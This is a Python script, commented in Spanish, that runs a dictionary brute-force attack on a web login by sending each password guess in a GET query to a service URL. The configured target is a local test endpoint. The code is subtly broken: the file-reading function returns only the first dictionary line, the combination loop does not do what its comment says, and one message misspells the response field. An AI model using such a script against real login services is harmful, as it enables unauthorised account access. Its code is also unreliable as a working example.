import time
import requests  # Para hacer peticiones HTTP

def leer_diccionario(nombre_archivo):
    """
    Lee un archivo de diccionario y devuelve una lista de palabras.
    """
    try:
        with open(nombre_archivo, 'r', encoding='utf-8') as archivo:
            palabras = [linea.strip() for linea in archivo]
        return palabras[0]
    except FileNotFoundError:
        print(f"Error: No se pudo encontrar el archivo del diccionario: {nombre_archivo}")
        return ""

def comprobar_contrasena_servicio(intento, servicio_url):
    """
    Comprueba si una contraseña es correcta haciendo una petición a un servicio web.
    """
    try:
        # Codificamos la contraseña en la URL. Asegúrate de que tu servicio maneje esto correctamente.
        url_con_password = servicio_url.format(password=intento)  # Usamos .format y el nombre del parámetro correcto
        print(f"Probando contraseña: {intento} con URL: {url_con_password}")
        response = requests.get(url_con_password)
        response.raise_for_status()  # Lanza una excepción para códigos de error HTTP (4xx o 5xx)

        # Parsea la respuesta JSON. Asume que el servicio devuelve JSON.
        resultado = response.json()
        print(f"Respuesta del servicio: {resultado}")  # Agregamos esto para ver la respuesta
        if "acierto" in resultado:
            return resultado["acierto"]
        else:
            print(f"Advertencia: El servicio no devolvió el campo 'acerto'. Respuesta: {resultado}")
            return False  

    except requests.exceptions.RequestException as e:
        print(f"Error al contactar al servicio: {e}")
        return False 
    except ValueError as e:
        print(f"Error al parsear la respuesta JSON: {e}. Respuesta del servicio: {response.text}")
        return False

def ataque_diccionario_servicio(diccionario_archivo, servicio_url):
    """
    Realiza un ataque de diccionario contra un servicio web.

    """
    tiempo_inicio = time.time()
    intentos = 0
    palabras = leer_diccionario(diccionario_archivo)
    if not palabras:
        return None  

    print(f"Realizando ataque de diccionario contra el servicio: {servicio_url} usando diccionario: {diccionario_archivo}")
    print(f"Total de palabras en el diccionario: {len(palabras)}")

    # Combinaciones de palabras de 5 a 8 caracteres
    for i in range(len(palabras)):
        for j in range(i + 4, min(i + 8, len(palabras))):  
            intento = "".join(palabras[i:j+1])
            intentos += 1
            if intentos % 10000 == 0:
                print(f"Intentos: {intentos}, Probando contraseña: {intento}")
            if comprobar_contrasena_servicio(intento, servicio_url):
                tiempo_fin = time.time()
                print(f"Contraseña encontrada: {intento}")
                print(f"Tiempo transcurrido: {tiempo_fin - tiempo_inicio:.2f} segundos")
                print(f"Intentos: {intentos}")
                return intento  # Detiene la búsqueda y devuelve la contraseña

    tiempo_fin = time.time()
    print("Contraseña no encontrada en el diccionario.")
    print(f"Tiempo transcurrido: {tiempo_fin - tiempo_inicio:.2f} segundos")
    print(f"Intentos: {intentos}")
    return None



def main():
    """
    Función principal para ejecutar el ataque de diccionario contra un servicio web.
    """
    diccionario_archivo = 'passwords.txt'  
    servicio_url = 'http://127.0.0.1:5000/login?password={password}'  

    contrasena_encontrada = ataque_diccionario_servicio(diccionario_archivo, servicio_url)
    if contrasena_encontrada:
        print(f"¡Contraseña encontrada!: {contrasena_encontrada}")
    else:
        print("No se pudo encontrar la contraseña.")



if __name__ == "__main__":
    main()
